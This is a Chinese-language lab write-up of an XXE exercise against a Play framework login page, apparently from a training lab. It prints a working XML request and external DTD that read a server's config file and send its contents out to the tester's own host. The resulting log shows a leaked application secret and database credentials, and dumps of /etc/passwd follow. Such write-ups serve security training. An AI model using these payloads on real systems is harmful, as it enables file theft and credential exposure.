这是一个xxe漏洞训练。
该框架可以解析xml请求，而且没有禁止外部实体引用。

1.首先在构造请求如下：
POST /login HTTP/1.1
Host: 192.168.32.146
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.32.146/login
Connection: keep-alive
Content-Type: text/xml
Content-Length: 99

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://192.168.32.141:8000/test.dtd">
<foo>&e1;</foo>

2. 192.168.32.141 这台机器是我的kali主机。
   使用python -m SimpleHTTPServer，构建一个简单服务器
   在当前目录新建一个dtd文件，当做外部实体引用。
   内容如下：
    <!ENTITY % p1  SYSTEM "file:///opt/play-2.1.3/xxe/conf/application.conf">
	<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.32.141:8000/BLAH?%p1;'>">
	%p2;
	这里用到了%号的参数实体。

3. 发送请求，就可以在主机上收到如下的log:
192.168.32.146 - - [30/Apr/2015 11:58:44] "GET /test.dtd HTTP/1.1" 200 -
192.168.32.146 - - [30/Apr/2015 11:58:44] code 404, message File not found
192.168.32.146 - - [30/Apr/2015 11:58:44] "GET /BLAH?application.secret=%22X7G@Abg53=2p=%5D%5B5F;uMNDm/QrDtVG0%5EiYHC3%5DOv0t0E6b_amL16UynUbqS_?_eG%22%0Aapplication.langs=%22en%22%0Adb.default.driver=com.mysql.jdbc.Driver%0Adb.default.url=%22mysql://pentesterlab:pentesterlab@localhost/xxe%22%0Aebean.default=%22models.*%22%0Alogger.root=ERROR%0Alogger.play=INFO%0Alogger.application=DEBUG%0A HTTP/1.1" 404 -

修改test.dtd中的内容即可完成任意文件读取。


/etc/passwd

root:x:0:0:root:/root:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/false
tc:x:1001:50:Linux User,,,:/home/tc:/bin/sh
pentesterlab:x:1000:50:Linux User,,,:/home/pentesterlab:/bin/sh
play:x:100:65534:Linux User,,,:/opt/play-2.1.3/xxe/:/bin/false
mysql:x:101:65534:Linux User,,,:/home/mysql:/bin/false

/opt/play-2.1.3/xxe/

.gitignore
.settings
app
conf
logs
project
public
README
RUNNING_PID
target
test

~/conf
application.conf
evolutions
routes

/opt/play-2.1.3/xxe/conf/routes
GET     /                           controllers.Application.index()
GET     /0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()
GET       /login                   controllers.Application.login
POST      /login                   controllers.Application.login
GET       /logout                  controllers.Application.logout

GET     /assets/*file               controllers.Assets.at(path="/public", file)

~/conf/application.conf
application.secret="X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"
application.langs="en"
db.default.driver=com.mysql.jdbc.Driver
db.default.url="mysql://pentesterlab:pentesterlab@localhost/xxe"
ebean.default="models.*"
logger.root=ERROR
logger.play=INFO
logger.application=DEBUG
